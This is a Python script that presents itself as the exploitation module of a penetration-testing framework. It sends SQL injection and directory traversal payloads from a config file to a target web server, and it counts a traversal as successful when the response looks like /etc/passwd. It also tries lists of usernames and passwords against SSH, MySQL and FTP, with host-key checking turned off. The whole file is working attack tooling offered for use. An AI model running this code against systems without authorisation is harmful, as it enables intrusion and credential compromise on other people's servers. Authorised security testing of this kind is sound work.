#!/usr/bin/env python3
"""
Exploitation modules for pentest framework
"""

import subprocess
import json
import yaml
import sys
from datetime import datetime
from pathlib import Path

class Exploiter:
    def __init__(self, config_file="config.yaml"):
        with open(config_file, 'r') as f:
            self.config = yaml.safe_load(f)
        self.results = []
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def test_sql_injection(self, target_url):
        """Test SQL injection vulnerabilities"""
        print(f"Testing SQL injection on {target_url}")
        results = []
        
        payloads = self.config['exploitation']['sql_injection_payloads']
        for payload in payloads:
            try:
                cmd = ["curl", "-s", f"{target_url}?id={payload}"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                results.append({
                    'payload': payload,
                    'response': result.stdout[:200],  # Limit response size
                    'success': 'error' in result.stdout.lower() or 'sql' in result.stdout.lower()
                })
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e),
                    'success': False
                })
        
        return results
    
    def test_directory_traversal(self, target_url):
        """Test directory traversal vulnerabilities"""
        print(f"Testing directory traversal on {target_url}")
        results = []
        
        payloads = self.config['exploitation']['directory_traversal_payloads']
        for payload in payloads:
            try:
                cmd = ["curl", "-s", f"{target_url}?file={payload}"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                results.append({
                    'payload': payload,
                    'response': result.stdout[:200],
                    'success': 'root:' in result.stdout or 'bin/bash' in result.stdout
                })
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e),
                    'success': False
                })
        
        return results
    
    def test_credentials(self, target, service, credentials):
        """Test credentials against a service"""
        print(f"Testing credentials for {service} on {target}")
        results = []
        
        for cred in credentials:
            username = cred['username']
            password = cred['password']
            
            if service == "ssh":
                result = self._test_ssh(target, username, password)
            elif service == "mysql":
                result = self._test_mysql(target, username, password)
            elif service == "ftp":
                result = self._test_ftp(target, username, password)
            else:
                result = {'success': False, 'error': 'Unknown service'}
            
            results.append({
                'username': username,
                'password': password,
                'service': service,
                **result
            })
        
        return results
    
    def _test_ssh(self, target, username, password):
        """Test SSH credentials"""
        try:
            cmd = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", 
                   "-o", "ConnectTimeout=2", f"{username}@{target}", "echo SUCCESS"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            return {
                'success': result.returncode == 0,
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _test_mysql(self, target, username, password):
        """Test MySQL credentials"""
        try:
            cmd = ["mysql", "-h", target, "-u", username, f"-p{password}", "-e", "SELECT 1"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            return {
                'success': result.returncode == 0,
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _test_ftp(self, target, username, password):
        """Test FTP credentials"""
        try:
            ftp_script = f"user {username} {password}\nquit\n"
            cmd = ["ftp", "-n", target]
            result = subprocess.run(cmd, input=ftp_script, capture_output=True, text=True, timeout=3)
            return {
                'success': '230' in result.stdout or 'Login successful' in result.stdout,
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_all(self):
        """Run all exploitation tests"""
        results = {}
        
        # Test web server
        web_target = self.config['targets']['web_server']
        web_url = f"http://{web_target['ip']}:80"
        
        results['web_server'] = {
            'sql_injection': self.test_sql_injection(web_url),
            'directory_traversal': self.test_directory_traversal(web_url)
        }
        
        # Test credentials on all targets
        for target_name, target_config in self.config['targets'].items():
            if 'credentials' in target_config:
                ip = target_config['ip']
                services = target_config['services']
                credentials = target_config['credentials']
                
                for service in services:
                    if service in ['ssh', 'mysql', 'ftp']:
                        key = f"{target_name}_{service}"
                        results[key] = self.test_credentials(ip, service, credentials)
        
        return results
    
    def save_results(self, results, filename=None):
        """Save exploitation results"""
        if filename is None:
            filename = f"exploitation_results_{self.timestamp}.json"
        
        output_dir = Path(self.config['output']['results_dir'])
        output_dir.mkdir(parents=True, exist_ok=True)
        
        filepath = output_dir / filename
        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nResults saved to: {filepath}")
        return filepath

if __name__ == "__main__":
    exploiter = Exploiter()
    
    print("Starting exploitation tests...")
    results = exploiter.exploit_all()
    
    exploiter.save_results(results)
